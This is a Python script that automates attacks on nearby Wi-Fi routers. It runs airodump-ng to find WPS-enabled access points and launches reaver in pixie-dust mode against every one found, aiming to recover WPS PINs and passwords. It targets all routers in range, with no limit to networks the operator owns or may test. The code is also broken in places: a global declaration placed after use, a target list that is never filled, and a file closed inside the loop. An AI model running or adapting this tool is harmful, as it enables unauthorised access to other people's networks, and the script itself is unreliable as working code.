#!/usr/bin/env python

'''
@author: rafcolm_

runs reaver+pixie-dust mode on all WPS-capable routers around you.

Required Argument:
	-i, --interface=<wlan>          Name of the monitor-mode interface

Example:
	reaver-er -i mon0

REQUIRES:
-input interface to be already in MONITOR MODE (use airmon-ng for that)
-needs to be run as sudo
-airodump-ng (with WPS feature; version 1.2 & up)
-reaver
-pixie-dust
'''
import sys
import subprocess
import os
from subprocess import TimeoutExpired, PIPE, call, STDOUT, check_output, DEVNULL
import time
import signal

global INTERFACE
global dumps_list
global wps_dumps
global SESSION_NAME
AIRODUMP_ON = 0

def signal_handler(signal, frame):
    os.system("sudo pkill airodump-ng")
    if AIRODUMP_ON == 0:
        print("\n[OUT]************ You pressed CTRL+C!  Terminated.  ************ \n")
        os.system("sudo pkill reaver")
        sys.exit(0)
    global AIRODUMP_ON
    AIRODUMP_ON = 0
    

def main():
    signal.signal(signal.SIGINT, signal_handler)
    if len(sys.argv) != 3:
        print(
            "Script that runs reaver+pixie-dust mode on all WPS-capable routers around you and prints the result.\n\nRequired Argument:\n     <wlan>          Name of the monitor-mode interface \n     <session>          Name for the current session\n\n Example: \n    reaver-er mon0 session0\n\n REQUIRES: \n -input interface to be already in MONITOR MODE (use airmon-ng for that) \n -needs to be run as sudo \n -airodump-ng (with WPS feature; version 1.2 & up) \n -reaver \n -pixie-dust")
        sys.exit()
    dumps_list = []
    INTERFACE = sys.argv[1]
    SESSION_NAME = sys.argv[2]
    print("\n[OUT]************ running AIRIDUMP-NG using ", INTERFACE, "  ************ \n")
    global AIRODUMP_ON
    AIRODUMP_ON = 1
    process = subprocess.Popen(["airodump-ng", INTERFACE, "--wps"], stderr=subprocess.STDOUT, stdout=subprocess.PIPE, bufsize=1)
    while AIRODUMP_ON:
        out = process.stdout.read(1)
        if out == '' and process.poll() != None:
    	    break
        if out != '':
    	    sys.stdout.write(out.decode('utf-8'))
    	    sys.stdout.flush()
    AIRODUMP_ON = 0
    print(out.decode('utf-8'))
    print("\n[OUT]************ AIRODUMP-NG done.  WPS routers available: ************ \n")
    print(        'BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH WPS                    ESSID\n')
    output_file = open(SESSION_NAME + '_full.txt', 'w+')
    output_file.write("[OUT]************ AIRODUMP-NG done.  WPS routers available: ************ \n")
    output_file.write(            'BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH WPS                    ESSID\n')
    wps_dumps = []
    essids = []
    for i in dumps_list:
        line = i.split()
        if len(line) >= 10:
            if line[0] not in essids:
                output_file.write(i.decode(encoding='UTF-8') + "\n")
                print(i.decode(encoding='UTF-8') + "\n")
                wps_dumps.append(i)
                essids.append(line[0])
    if len(wps_dumps) <= 0:
        print("\n\n[OUT]************ NO WPS ROUTER FOUND AROUND.  Terminating.\n\n")
        output_file.close()
        os.remove(output_file.name)
        sys.exit()
    for wps in wps_dumps:
        temp = wps.split()
        output_file.write("\n[OUT]********************* PIXIE-DUST on " + temp[0].decode(
            encoding='UTF-8') + "  *********************\n")
        print("\n[OUT]********************* PIXIE-DUST on " + temp[0].decode(
            encoding='UTF-8') + "  *********************\n")
        reaver_p = subprocess.Popen(["reaver", "-i", INTERFACE, "-b", temp[0].decode(encoding='UTF-8'), "-v", "-c",
                                     temp[5].decode(encoding='UTF-8'), "-d", "12", "-N", "-K", "1", "-Z"], stdout=PIPE)
        try:
            reaver_o, unused_reaver = reaver_p.communicate(timeout=400)
            print("\n[OUT]************ SESSION SUCCESFUL. Output:*********************\n")
            os.system("sudo pkill reaver")
            output_file.write(reaver_o.decode(encoding='UTF-8'))
            print(reaver_o.decode(encoding='UTF-8'))
        except TimeoutExpired:
            os.system("sudo pkill reaver")
            print("\n[OUT]************ SESSION FAILED. *********************\n")
            pass
        output_file.close()
        os.system("sudo pkill reaver")
        print("\n\n[OUT]************  DONE.  *********************\n\n")


if __name__ == '__main__':
    main()

